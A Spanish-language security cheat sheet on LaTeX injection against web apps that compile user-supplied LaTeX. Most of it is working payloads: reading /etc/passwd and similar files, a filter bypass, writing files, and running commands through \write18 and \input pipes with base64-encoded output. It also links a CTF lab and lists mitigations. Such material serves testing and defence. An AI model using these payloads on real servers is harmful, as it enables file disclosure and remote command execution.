# Inyección LaTeX (LaTeX Injection)

LaTeX es un sistema de composición tipográfica muy usado en publicaciones académicas y científicas. Algunas aplicaciones web permiten a los usuarios escribir texto en formato LaTeX para generar PDFs u otros documentos.

Si el servidor procesa ese input sin sanitizarlo, un atacante puede inyectar comandos LaTeX para **leer archivos del sistema** o **ejecutar comandos** en el servidor.

> Esta vulnerabilidad solo existe en aplicaciones que integran un compilador LaTeX en el backend (ej. `pdflatex`, `xelatex`, `lualatex`).

---

## Modos de ejecución del compilador

El nivel de riesgo depende de cómo está configurado el compilador:

| Flag | Descripción |
|---|---|
| `-no-shell-escape` | Deshabilita `\write18`. Es el modo más seguro. |
| `-shell-restricted` | Permite solo un conjunto limitado de comandos predefinidos. |
| `-shell-escape` | Habilita `\write18` completamente — **ejecuta cualquier comando shell**. |

---

## Lectura de archivos

### Método directo

```latex
\input{/etc/passwd}
\include{/etc/hosts}
```

Si `input` o `include` están filtradas, intentar con definiciones personalizadas:

```latex
\def\first{in}
\def\second{put}
\first\second{/etc/passwd}
```

### Lectura línea a línea

```latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
```

### Lectura de múltiples líneas (bucle)

```latex
\newread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```

### Lectura con formato preservado

```latex
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```

---

## Escritura de archivos

```latex
\newwrite\outfile
\openout\outfile=output.tex
\write\outfile{contenido a escribir}
\closeout\outfile
```

---

## Ejecución de comandos (si `shell-escape` está activo)

La construcción `\write18{}` permite ejecutar comandos del sistema operativo:

```latex
\immediate\write18{id > output.tex}
\input{output.tex}
```

Si el output contiene caracteres problemáticos para LaTeX, exfiltrar en Base64:

```latex
\immediate\write18{id | base64 > output.tex}
\input{output.tex}
```

```latex
\immediate\write18{env | base64 > output.tex}
\input{output.tex}
```

**Con pipes directos:**
```latex
\input|"id"
\input{|"/bin/hostname"}
\input|"ls | base64"
```

---

## Payloads adicionales

Referencia completa de payloads: [http://salmonsec.com/cheatsheets/exploitation/latex_injection](http://salmonsec.com/cheatsheets/exploitation/latex_injection)

---

## Laboratorio para practicar

- **Internetwache CTF 2016 — Web90**: [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)

---

## Mitigaciones

- Compilar con `-no-shell-escape` siempre (nunca `-shell-escape` en producción)
- Sanitizar el input: eliminar o escapar `\`, `{`, `}`, `$`, `%`, `#`, `_`, `^`, `~`
- Ejecutar el compilador en un entorno aislado (contenedor Docker sin acceso a la red ni a archivos del sistema)
- Usar una lista blanca de comandos LaTeX permitidos
- No exponer los archivos generados en rutas predecibles
